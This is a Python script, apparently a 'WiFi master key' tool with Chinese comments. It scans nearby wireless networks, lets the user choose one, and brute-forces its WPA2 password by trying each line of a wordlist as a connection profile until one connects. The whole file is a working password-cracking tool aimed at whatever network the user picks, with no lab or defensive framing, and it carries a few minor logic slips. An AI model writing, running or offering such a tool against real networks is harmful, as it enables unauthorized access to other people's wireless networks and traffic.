from tracemalloc import start
from numpy import choose
import pywifi
import time
from pywifi import const

# Wifi 扫描模块
def wifi_scan():
    # 初始化wifi
    wifi = pywifi.PyWiFi()
    # 使用网卡 (默认为第一张，但有特殊情况)
    interface = wifi.interfaces()[1]
    print(interface)
    # 开始扫描
    interface.scan()
    for i in range(6):
        # 添加一个倒计时等待
        time.sleep(1)
        print('\r扫描周边WIFI***('+ str(5 - i), end=')') 
    print('\r扫描完成\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('编号', '信号强度', 'WIFI名称'))
    # 扫描结果， scan_results()返回一个集，存放每个wifi对象
    bss = interface.scan_results()
    # 存放wifi名的集合
    wifi_name_set = set()
    for w in bss:
        # 解决乱码问题
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # 存放列表并按信号排序
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # 格式化输出
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # 返回WiFi列表
    return wifi_name_list

def wifi_password_crack(wifi_name):
    # 字典路径
    wifi_dic_path = input('请输入字典路径(txt格式;每个密码占一行) >>')
    if len(wifi_dic_path ) == 0:
        print('字典路径无效')
        wifi_dic_path = input('请重新输入字典路径 >>')
        
    else:
        with open(wifi_dic_path, 'r') as f:
            # 遍历密码
            for pwd in f:
                # 去除密码的末尾换行符
                pwd = pwd.strip('\n')
                # 创建wifi对象
                wifi = pywifi.PyWiFi()
                # 创建网卡对象，为第一个WiFi网卡
                interface = wifi.interfaces()[1]
                # 断开所有的WiFi连接
                interface.disconnect()
                # 等待其断开
                while interface.status() == 4:
                    # 当处于连接状态时，利用循环等待其断开
                    pass
                # 创建连接文件(对象)
                profile = pywifi.Profile()
                # wifi名称
                profile.ssid = wifi_name
                # 需要认证
                profile.auth = const.AUTH_ALG_OPEN
                # wifi 默认加密算法
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                # WiFi密码
                profile.key = pwd   
                # 删除所有的wifi连接文件
                interface.remove_all_network_profiles()
                # 设置新的WiFi连接文件
                tmp_profile = interface.add_network_profile(profile)
                # 开始尝试连接
                interface.connect(tmp_profile)
                start_time = time.time()
                while time.time() - start_time < 1.5:
                    # 接口状态为4 代表连接成功(当尝试时间大于1.5秒之后为错误密码,可适当延长时间)
                    if interface.status() == 4:
                        print(f'\r连接成功! 密码为:{pwd}')
                        exit(0)
                    else:
                        print(f'\r正在利用密码 {pwd} 尝试破解', end='')

# 主函数
def main():
    # 退出标志
    exit_flag = 0 
    # 目标编号
    target_num = -1
    while not exit_flag:
        try:
            print('WIFI万能钥匙'.center(35, '-'))
            # 调用扫描模块， 返回一个排序后的wifi列表
            wifi_list = wifi_scan()
            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('请选择需要尝试破解的WiFi >> '))
                    # 如果选择的WiFi编号在列表内，继续二次判断，否则重新输入
                    if target_num in range(len(wifi_list)):
                        # 二次确认
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'选择要破解的WiFi名称为:{wifi_list[target_num][1]},确认吗? (Y/N)'))
                                # 对用户输入进行处理，并判断
                                if choose.lower() == 'y' or choose.lower() == 'Y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n' and choose.lower() == 'N':
                                    break
                                # 处理用户其他字母输入
                                else:
                                    print('只能输入 Y/N 暂不支持其他功能')
                            # 处理用户非字母输入
                            except ValueError:
                                print('只能输入 Y/N 软体出错')
                        # 退出破解
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('请重新输入*-*')
                except ValueError:
                    print('只支持数字输入*&*')
            # 密码破解，传入用户选择的WiFi名称
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e

if __name__ == '__main__':
    main()
